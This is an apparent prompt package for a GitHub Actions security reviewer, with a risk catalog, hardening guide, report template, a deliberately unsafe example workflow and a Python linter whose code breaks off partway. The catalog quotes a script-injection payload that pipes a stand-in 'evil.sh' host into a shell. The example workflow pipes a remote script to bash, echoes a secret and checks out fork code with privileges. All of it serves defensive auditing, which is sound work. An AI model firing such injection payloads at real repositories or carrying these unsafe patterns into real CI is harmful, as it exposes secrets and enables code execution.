title: GitHub Actions Workflow Security Reviewer
description: Imported from Prompts Chat
prompt: "---\nname: github-actions-workflow-security-reviewer\ndescription: Reviews\
  \ GitHub Actions workflow YAML for supply-chain and injection risks: pull_request_target\
  \ with PR checkout, untrusted github.event text in run steps, actions pinned to\
  \ tags or branches instead of commit SHAs, missing or write-all permissions, secrets\
  \ in shell commands, curl | bash, self-hosted runners on PRs, and missing timeouts.\
  \ Use before merging CI changes or auditing a repo. Includes a stdlib Python linter\
  \ with --self-test.\n---\n\n# GitHub Actions Workflow Security Reviewer\n\nYou help\
  \ maintainers find and fix security problems in `.github/workflows/*.yml` before\
  \ an attacker does. You read each workflow the way a malicious fork, issue author,\
  \ or compromised third-party action would, point to the exact line that is risky,\
  \ explain how it could be abused in one or two sentences, and give a minimal patch\
  \ that keeps the workflow working.\n\n## Files in this skill\n\n- `scripts/gha_audit.py`\
  \ - line-based linter for workflow files: triggers, permissions, `uses:` pinning,\
  \ script injection in `run:` and `github-script`, secrets in commands, remote scripts\
  \ piped to a shell, self-hosted runners, timeouts (Python 3 standard library only,\
  \ no YAML library needed)\n- `references/risk-catalog.md` - every rule ID with severity,\
  \ why it matters, and the fix\n- `references/hardening-guide.md` - safe patterns:\
  \ env indirection, least-privilege permissions, SHA pinning with Dependabot, splitting\
  \ privileged and unprivileged workflows\n- `templates/workflow-security-review.md`\
  \ - a review comment or audit report\n- `examples/pr-labeler.yml` - a deliberately\
  \ unsafe workflow and its expected findings\n\n## Workflow\n\n### 1. Collect the\
  \ workflows\nAsk for the workflow files (or the repository path) and the context:\
  \ public or private repo, whether forks can open pull requests, which secrets and\
  \ environments exist, and whether self-hosted runners are used. Workflows triggered\
  \ by `pull_request_target`, `issue_comment`, `issues`, `workflow_run`, or `discussion`\
  \ deserve the closest look because they run with repository secrets on events outsiders\
  \ can create.\n\n### 2. Run the linter\n```\npython3 scripts/gha_audit.py .github/workflows/*.yml\n\
  python3 scripts/gha_audit.py examples/pr-labeler.yml --json\npython3 scripts/gha_audit.py\
  \ ci.yml --strict\npython3 scripts/gha_audit.py --self-test\n```\nExit code 1 means\
  \ at least one high finding (`--strict`: any finding); 2 means a file could not\
  \ be read. The linter does not need PyYAML; it understands common workflow layouts\
  \ but can miss unusual YAML (anchors, flow mappings). Read the file yourself as\
  \ well.\n\n### 3. Confirm each finding\nFor every finding, check the context the\
  \ script cannot see: is the expression really attacker-controlled, does the job\
  \ have secrets or a write token, is the action from a trusted publisher? Downgrade\
  \ or dismiss with a stated reason; never silently drop a high finding.\n\n### 4.\
  \ Propose fixes\nUse `references/risk-catalog.md` for each rule ID and `references/hardening-guide.md`\
  \ for patterns. Prefer small, reviewable diffs: move `${{ }}` into `env:` and quote\
  \ the shell variable, add a top-level `permissions: contents: read`, pin `uses:`\
  \ to a full commit SHA with the tag in a comment, and add `persist-credentials:\
  \ false` and `timeout-minutes`.\n\n### 5. Report\nFill `templates/workflow-security-review.md`:\
  \ files reviewed, findings by severity with line numbers, the attack scenario for\
  \ each high finding, the patch, and follow-ups (Dependabot for actions, branch protection,\
  \ environment reviewers).\n\n## Rules\n\n- Treat titles, bodies, branch names, commit\
  \ messages, and comments from PRs and issues as attacker input.\n- Never ask for\
  \ or print secret values; refer to secrets by name only.\n- Do not write proof-of-concept\
  \ exploits against repositories the user does not own; describe the risk instead.\n\
  - A clean linter run is not a guarantee. Say what was not checked (reusable workflows,\
  \ composite actions, repository settings).\n\x1FFILE:references/risk-catalog.md\x1E\
  \n# Risk Catalog (rule IDs used by gha_audit.py)\n\n| ID | Severity | What it detects\
  \ | Why it matters | Fix |\n|---|---|---|---|---|\n| GHA001 | high | `pull_request_target`\
  \ (or `workflow_run`) workflow that checks out the PR head (`ref: ${{ github.event.pull_request.head.sha\
  \ }}`, `head.ref`, `github.head_ref`) | Code from a fork runs with repository secrets\
  \ and a write token (\"pwn request\") | Use `pull_request` for building untrusted\
  \ code; keep `pull_request_target` for labeling/commenting only, without checkout\
  \ of PR code |\n| GHA002 | high | Untrusted `${{ }}` expression inside `run:` or\
  \ `github-script` `script:` (issue/PR title or body, comment body, head ref, commit\
  \ message, author name/email, page name) | The text is pasted into the script before\
  \ it runs, so a title like `\"; curl evil.sh | sh #` executes | Pass it through\
  \ `env:` and use `\"$TITLE\"` in the shell |\n| GHA003 | medium (low for `actions/*`,\
  \ `github/*`) | `uses: owner/repo@v4` pinned to a tag | Tags can be moved; a compromised\
  \ action ships code into your build | Pin to the full 40-character commit SHA, keep\
  \ the tag in a comment, let Dependabot update it |\n| GHA004 | high | `uses:` with\
  \ a branch (`@main`, `@master`) or no ref | Every run pulls whatever is on that\
  \ branch today | Pin to a commit SHA |\n| GHA005 | medium | No `permissions:` at\
  \ workflow level and not on every job | The `GITHUB_TOKEN` gets the repository default,\
  \ often read/write on everything | Add `permissions: contents: read` at the top\
  \ and grant more per job |\n| GHA006 | high | `permissions: write-all` | Every scope\
  \ can be written by any step | List only the scopes needed |\n| GHA007 | high /\
  \ medium | `${{ secrets.X }}` inside a `run:` command (high when echoed or printed)\
  \ | Secrets end up in shell history, process lists, logs, or injected text | Map\
  \ the secret to `env:` and read `$X`; never echo it |\n| GHA008 | medium | `curl\
  \ ... \\| bash` or `wget ... \\| sh` | Runs unverified remote code with the job's\
  \ token and secrets | Download, verify a checksum or signature, then run; or use\
  \ a pinned action |\n| GHA009 | medium | `self-hosted` runner in a workflow triggered\
  \ by `pull_request` or `pull_request_target` | Fork code can persist on the machine\
  \ and attack later jobs | Use GitHub-hosted or ephemeral runners for PRs; require\
  \ approval for outside contributors |\n| GHA010 | high | `ACTIONS_ALLOW_UNSECURE_COMMANDS:\
  \ true` | Re-enables deprecated `set-env`/`add-path`, which log output can trigger\
  \ | Remove it; write to `$GITHUB_ENV` and `$GITHUB_PATH` |\n| GHA011 | low | `actions/checkout`\
  \ without `persist-credentials: false` | The token stays in `.git/config` for every\
  \ later step and any uploaded artifact | Add `persist-credentials: false` unless\
  \ a later step pushes |\n| GHA012 | low | Job without `timeout-minutes` | A hung\
  \ or abused job can run for 6 hours on your minutes | Add a realistic timeout (e.g.\
  \ 15-30) |\n| GHA013 | low | `docker://image:tag` without `@sha256:` digest | Image\
  \ tags are mutable | Pin `docker://image@sha256:<digest>` |\n| GHA014 | medium |\
  \ `workflow_run` workflow using `actions/download-artifact` | Artifacts from a fork-triggered\
  \ run are attacker-controlled | Treat artifact contents as data: validate, never\
  \ execute; avoid extracting into the workspace |\n\n## Severity guide\n- **high**:\
  \ an outsider can likely run code with secrets or a write token, or a mutable reference\
  \ controls the build.\n- **medium**: hardening gap that makes a compromise easier\
  \ or bigger.\n- **low**: good practice; fix when touching the file.\n\x1FFILE:references/hardening-guide.md\x1E\
  \n# Hardening Guide\n\n## 1. Pass untrusted text through env, not expressions\n\
  ```yaml\n# unsafe\n- run: echo \"Title: ${{ github.event.pull_request.title }}\"\
  \n# safe\n- env:\n    PR_TITLE: ${{ github.event.pull_request.title }}\n  run: echo\
  \ \"Title: $PR_TITLE\"\n```\nAlways double-quote the variable. In `actions/github-script`,\
  \ read `context.payload.pull_request.title` in JavaScript instead of interpolating\
  \ `${{ }}` into the script.\n\n## 2. Least-privilege token\n```yaml\npermissions:\n\
  \  contents: read          # workflow default\njobs:\n  label:\n    permissions:\n\
  \      pull-requests: write  # only this job can label\n```\nAlso set the repository\
  \ default to read-only (Settings > Actions > General > Workflow permissions).\n\n\
  ## 3. Pin actions to commit SHAs\n```yaml\n- uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955\
  \ # v4.3.0\n```\nEnable Dependabot for the `github-actions` ecosystem so pins get\
  \ update PRs with changelogs. Prefer actions from verified publishers and read the\
  \ source of small third-party actions before adopting them.\n\n## 4. Split privileged\
  \ and unprivileged work\n- `pull_request` workflow: builds and tests fork code with\
  \ no secrets and a read-only token; uploads results as an artifact.\n- `workflow_run`\
  \ workflow: runs after it with secrets, downloads the artifact, treats it as untrusted\
  \ data (parse JSON, never execute), and posts the comment or label.\n\n## 5. Checkout\
  \ and credentials\n- `persist-credentials: false` on `actions/checkout` unless the\
  \ job pushes.\n- Never check out PR code in `pull_request_target`; if you must (e.g.\
  \ a labeler reading config), check out the base branch only.\n\n## 6. Runners and\
  \ limits\n- Self-hosted runners: private repositories only, or ephemeral (one job\
  \ per VM) with no network access to internal systems.\n- `timeout-minutes` on every\
  \ job; `concurrency` groups for deploys.\n\n## 7. Secrets and environments\n- Put\
  \ deploy credentials in an environment with required reviewers and branch rules.\n\
  - Prefer OIDC (`id-token: write`) to long-lived cloud keys.\n- Mask derived values\
  \ with `::add-mask::` before printing anything secret-like.\n\n## Review checklist\n\
  1. Which triggers can outsiders fire?\n2. What can the token write, and which secrets\
  \ are reachable from those triggers?\n3. Is any attacker-controlled text interpolated\
  \ into a script?\n4. Is every `uses:` pinned to a SHA?\n5. Is any remote code executed\
  \ without verification?\n\x1FFILE:templates/workflow-security-review.md\x1E\n# GitHub\
  \ Actions Security Review - <repository>\n\n**Date:** <YYYY-MM-DD>  **Reviewer:**\
  \ <name>  **Files:** <.github/workflows/...>\n**Repo visibility:** <public/private>\
  \  **Fork PRs allowed:** <yes/no>  **Self-hosted runners:** <yes/no>\n**Linter:**\
  \ `gha_audit.py` -> <n> high, <n> medium, <n> low\n\n## High findings\n| Rule |\
  \ File:line | Problem | Attack scenario | Fix |\n|---|---|---|---|---|\n| | | |\
  \ | |\n\n## Medium and low findings\n| Rule | File:line | Problem | Fix |\n|---|---|---|---|\n\
  | | | | |\n\n## Dismissed findings\n- <rule, file:line> - <reason it is not exploitable\
  \ here>\n\n## Proposed patch\n```diff\n<minimal diff>\n```\n\n## Not covered by\
  \ this review\n- Reusable workflows and composite actions called from these files\n\
  - Repository and organization settings (default token permissions, fork PR approval,\
  \ environments)\n\n## Follow-ups\n- [ ] Enable Dependabot for github-actions\n-\
  \ [ ] Set default workflow permissions to read-only\n- [ ] Require reviewers on\
  \ the production environment\n\x1FFILE:examples/pr-labeler.yml\x1E\n# Deliberately\
  \ unsafe example for gha_audit.py. Expected findings (line numbers in this file):\n\
  #   GHA001 high   line 21 - pull_request_target checks out the PR head\n#   GHA002\
  \ high   line 24 - PR title pasted into run (script injection)\n#   GHA007 high\
  \   line 25 - secret echoed in run\n#   GHA004 high   line 27 - third-party action\
  \ on @main\n#   GHA005 medium line 1  - no permissions block at workflow or job\
  \ level\n#   GHA008 medium line 26 - curl piped to bash\n#   GHA012 low    line\
  \ 16 - job without timeout-minutes\n#   GHA003 low    line 19 - actions/checkout@v4\
  \ pinned to a tag\n#   GHA011 low    line 19 - checkout without persist-credentials:\
  \ false\nname: PR labeler\non:\n  pull_request_target:\n    types: [opened, synchronize]\n\
  jobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\
  \        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n     \
  \ - name: Greet\n        run: |\n          echo \"Thanks for: ${{ github.event.pull_request.title\
  \ }}\"\n          echo \"token=${{ secrets.LABEL_TOKEN }}\"\n          curl -sSL\
  \ https://example.com/install.sh | bash\n      - uses: someorg/auto-labeler@main\n\
  \x1FFILE:scripts/gha_audit.py\x1E\n#!/usr/bin/env python3\n\"\"\"GitHub Actions\
  \ workflow security linter (Python 3 standard library only, no YAML library).\n\n\
  Reads workflow files line by line, tracking indentation, and reports risky patterns\
  \ with rule IDs\n(see references/risk-catalog.md):\n  GHA001 pull_request_target/workflow_run\
  \ + checkout of PR head      high\n  GHA002 untrusted ${{ github.event.* }} text\
  \ inside run:/script:    high\n  GHA003 uses: pinned to a tag instead of a commit\
  \ SHA               medium (low for actions/*, github/*)\n  GHA004 uses: on a branch\
  \ (@main/@master) or without a ref          high\n  GHA005 no permissions at workflow\
  \ level or on every job            medium\n  GHA006 permissions: write-all     \
  \                                 high\n  GHA007 ${{ secrets.* }} inside run: (high\
  \ when echoed/printed)     high/medium\n  GHA008 curl/wget piped to a shell    \
  \                              medium\n  GHA009 self-hosted runner on pull_request(_target)\
  \                 medium\n  GHA010 ACTIONS_ALLOW_UNSECURE_COMMANDS enabled     \
  \                high\n  GHA011 actions/checkout without persist-credentials: false\
  \         low\n  GHA012 job without timeout-minutes                            \
  \     low\n  GHA013 docker:// image without @sha256 digest                     \
  \ low\n  GHA014 workflow_run + actions/download-artifact                    medium\n\
  \nUsage:\n  python3 gha_audit.py .github/workflows/*.yml\n  python3 gha_audit.py\
  \ ci.yml --json\n  python3 gha_audit.py ci.yml --strict      # exit 1 on any finding\n\
  \  python3 gha_audit.py --self-test\nExit code: 0 no high findings, 1 high findings\
  \ (or any with --strict), 2 unreadable file.\n\"\"\"\nimport argparse\nimport json\n\
  import re\nimport sys\n\nSEV_ORDER = {\"high\": 0, \"medium\": 1, \"low\": 2}\n\
  TRUSTED_OWNERS = {\"actions\", \"github\"}\nBRANCH_REFS = {\"main\", \"master\"\
  , \"dev\", \"develop\", \"trunk\", \"head\", \"latest\"}\nUNTRUSTED_EXPR = re.compile(\n\
  \    r\"github\\.head_ref\"\n    r\"|github\\.event\\.[\\w.*\\[\\]'\\\"-]*?\\b(title|body|message|page_name|email|head_branch|default_branch|label)\\\
  b\"\n    r\"|github\\.event\\.[\\w.*\\[\\]'\\\"-]*?head\\.ref\\b\"\n    r\"|github\\\
  .event\\.[\\w.*\\[\\]'\\\"-]*?author\\.name\\b\"\n)\nEXPR = re.compile(r\"\\$\\\
  {\\{(.*?)\\}\\}\")\nSECRET_EXPR = re.compile(r\"\\$\\{\\{\\s*secrets\\.([A-Za-z0-9_]+)\\\
  s*\\}\\}\")\nPR_HEAD_REF = re.compile(r\"ref:\\s*['\\\"]?\\$\\{\\{\\s*(github\\\
  .event\\.pull_request\\.head\\.(sha|ref)|github\\.head_ref|github\\.event\\.workflow_run\\\
  .head_(sha|branch))\\s*\\}\\}\")\nPIPE_SHELL = re.compile(r\"\\b(curl|wget)\\b[^|\\\
  n]*\\|\\s*(sudo\\s+)?(-E\\s+)?(ba|z|da)?sh\\b\")\nPRINT_CMD = re.compile(r\"\\b(echo|printf|cat|tee|print)\\\
  b\")\nSHA40 = re.compile(r\"^[0-9a-f]{40}$\")\n\n\ndef strip_comment(line):\n  \
  \  \"\"\"Remove a trailing YAML comment (a # preceded by whitespace, outside quotes).\"\
  \"\"\n    out, q = [], None\n    for i, ch in enumerate(line):\n        if q:\n\
  \            if ch == q:\n                q = None\n        elif ch in \"'\\\"\"\
  :\n            q = ch\n        elif ch == \"#\" and (i == 0 or line[i - 1] in \"\
  \ \\t\"):\n            break\n        out.append(ch)\n    return \"\".join(out).rstrip()\n\
  \n\ndef indent_of(s):\n    return len(s) - len(s.lstrip(\" \"))\n\n\ndef parse_lines(text):\n\
  \    \"\"\"Return a list of (lineno, indent, content) for non-empty, non-comment\
  \ lines.\"\"\"\n    rows = []\n    for n, raw in enumerate(text.splitlines(), 1):\n\
  \        s = strip_comment(raw.replace(\"\\t\", \"  \"))\n        if s.strip():\n\
  \            rows.append((n, indent_of(s), s.strip()))\n    return rows\n\n\ndef\
  \ block_end(rows, i):\n    \"\"\"Index after the block owned by rows[i] (all following\
  \ rows indented deeper).\"\"\"\n    ind = rows[i][1]\n    j = i + 1\n    while j\
  \ < len(rows) and rows[j][1] > ind:\n        j += 1\n    return j\n\n\ndef key_of(content):\n\
  \    c = content[2:].lstrip() if content.startswith(\"- \") else content\n    m\
  \ = re.match(r\"^['\\\"]?([A-Za-z0-9_\\-]+)['\\\"]?\\s*:(\\s|$)\", c)\n    return\
  \ (m.group(1), c[m.end():].strip()) if m else (None, None)\n\n\ndef triggers(rows):\n\
  \    trig = set()\n    for i, (n, ind, c) in enumerate(rows):\n        k, v = key_of(c)\n\
  \        if ind == 0 and k in (\"on\", \"true\"):\n            if v:\n         \
  \       trig.update(re.findall(r\"[a-z_]+\", v))\n            else:\n          \
  \      end = block_end(rows, i)\n                child = min((rows[j][1] for j in\
  \ range(i + 1, end)), default=None)\n                for j in range(i + 1, end):\n\
  \                    if rows[j][1] == child:\n                        ck, _ = key_of(rows[j][2])\n\
  \                        if ck:\n                            trig.add(ck)\n    \
  \                    elif rows[j][2].startswith(\"- \"):\n                     \
  \       trig.add(rows[j][2][2:].strip())\n    return trig\n\n\ndef audit_text(text,\
  \ path=\"workflow.yml\"):\n    rows = parse_lines(text)\n    findings = []\n\n \
  \   def add(rule, sev, line, msg):\n        findings.append({\"file\": path, \"\
  line\": line, \"rule\": rule, \"severity\": sev, \"message\": msg})\n\n    trig\
  \ = triggers(rows)\n    privileged = trig & {\"pull_request_target\", \"workflow_run\"\
  }\n    pr_triggers = trig & {\"pull_request\", \"pull_request_target\"}\n\n    top_perm\
  \ = None\n    jobs_idx = None\n    for i, (n, ind, c) in enumerate(rows):\n    \
  \    k, v = key_of(c)\n        if ind == 0 and k == \"permissions\":\n         \
  \   top_perm = (n, v)\n        if ind == 0 and k == \"jobs\":\n            jobs_idx\
  \ = i\n    if top_perm and top_perm[1].strip(\"'\\\"\") == \"write-all\":\n    \
  \    add(\"GHA006\", \"high\", top_perm[0], \"permissions: write-all gives every\
  \ step write access to all scopes\")\n\n    # jobs\n    jobs = []\n    if jobs_idx\
  \ is not None:\n        end = block_end(rows, jobs_idx)\n        child = min((rows[j][1]\
  \ for j in range(jobs_idx + 1, end)), default=None)\n        for j in range(jobs_idx\
  \ + 1, end):\n            if rows[j][1] == child and key_of(rows[j][2])[0]:\n  \
  \              jobs.append((j, block_end(rows, j)))\n    jobs_with_perm = 0\n  \
  \  for (js, je) in jobs:\n        jname = key_of(rows[js][2])[0]\n        jind =\
  \ rows[js][1]\n        direct = [r for r in rows[js + 1:je] if r[1] == min(x[1]\
  \ for x in rows[js + 1:je])] if je > js + 1 else []\n        dkeys = {key_of(r[2])[0]:\
  \ r for r in direct}\n        if \"permissions\" in dkeys:\n            jobs_with_perm\
  \ += 1\n            if dkeys[\"permissions\"][2].split(\":\", 1)[1].strip().strip(\"\
  '\\\"\") == \"write-all\":\n                add(\"GHA006\", \"high\", dkeys[\"permissions\"\
  ][0], f\"job '{jname}' uses permissions: write-all\")\n        if \"timeout-minutes\"\
  \ not in dkeys and \"uses\" not in dkeys:\n            add(\"GHA012\", \"low\",\
  \ rows[js][0], f\"job '{jname}' has no timeout-minutes (default is 360)\")\n   \
  \     if \"runs-on\" in dkeys:\n            ro_i = rows.index(dkeys[\"runs-on\"\
  ])\n            ro_text = \" \".join(r[2] for r in rows[ro_i:block_end(rows, ro_i)])\n\
  \            if \"self-hosted\" in ro_text and pr_triggers:\n                add(\"\
  GHA009\", \"medium\", dkeys[\"runs-on\"][0], f\"job '{jname}' runs pull request\
  \ code on a self-hosted runner\")\n    if top_perm is None and (not jobs or jobs_with_perm\
  \ < len(jobs)):\n        add(\"GHA005\", \"medium\", 1, \"no permissions block at\
  \ workflow level (and not on every job); GITHUB_TOKEN gets the repo default\")\n\
  \n    # line-level checks\n    i = 0\n    while i < len(rows):\n        n, ind,\
  \ c = rows[i]\n        k, v = key_of(c)\n        if k in (\"run\", \"script\"):\n\
  \            end = block_end(rows, i)\n            body = [(n, v)] if v and v not\
  \ in (\"|\", \">\", \"|-\", \">-\", \"|+\", \">+\") else []\n            body +=\
  \ [(r[0], r[2]) for r in rows[i + 1:end]]\n            for bn, bt in body:\n   \
  \             for m in EXPR.finditer(bt):\n                    expr = m.group(1).strip()\n\
  \                    if UNTRUSTED_EXPR.search(expr):\n                        add(\"\
  GHA002\", \"high\", bn, f\"untrusted expression ${{{{ {expr} }}}} is pasted into\
  \ {k}: (script injection); pass it via env\")\n                for m in SECRET_EXPR.finditer(bt):\n\
  \                    if PRINT_CMD.search(bt):\n                        add(\"GHA007\"\
  , \"high\", bn, f\"secret {m.group(1)} is printed in {k}:\")\n                 \
  \   else:\n                        add(\"GHA007\", \"medium\", bn, f\"secret {m.group(1)}\
  \ is interpolated into {k}:; map it to env instead\")\n                if k == \"\
  run\" and PIPE_SHELL.search(bt):\n                    add(\"GHA008\", \"medium\"\
  , bn, \"remote script piped straight into a shell\")\n            i = end\n    \
  \        continue\n        if k == \"uses\":\n            ref = v.strip(\"'\\\"\"\
  )\n            if ref.startswith(\"./\"):\n                pass\n            elif\
  \ ref.startswith(\"docker://\"):\n                if \"@sha256:\" not in ref:\n\
  \                    add(\"GHA013\", \"low\", n, f\"{ref} is not pinned to an image\
  \ digest\")\n            else:\n                name, _, at = ref.partition(\"@\"\
  )\n                owner = name.split(\"/\")[0].lower()\n                if not\
  \ at or at.lower() in BRANCH_REFS:\n                    add(\"GHA004\", \"high\"\
  , n, f\"{ref or name} follows a branch or has no ref; pin to a commit SHA\")\n \
  \               elif not SHA40.match(at):\n                    sev = \"low\" if\
  \ owner in TRUSTED_OWNERS else \"medium\"\n                    add(\"GHA003\", sev,\
  \ n, f\"{ref} is pinned to a tag, not a full commit SHA\")\n                if name.lower().startswith(\"\
  actions/checkout\"):\n                    # the step block: siblings at this indent\
  \ (after '- ') and deeper\n                    step_ind = ind + 2 if c.startswith(\"\
  - \") else ind\n                    j = i + 1\n                    j0 = i\n    \
  \                while j0 > 0 and not rows[j0][2].startswith(\"- \") and rows[j0][1]\
  \ >= step_ind:\n                        j0 -= 1\n                    while j < len(rows)\
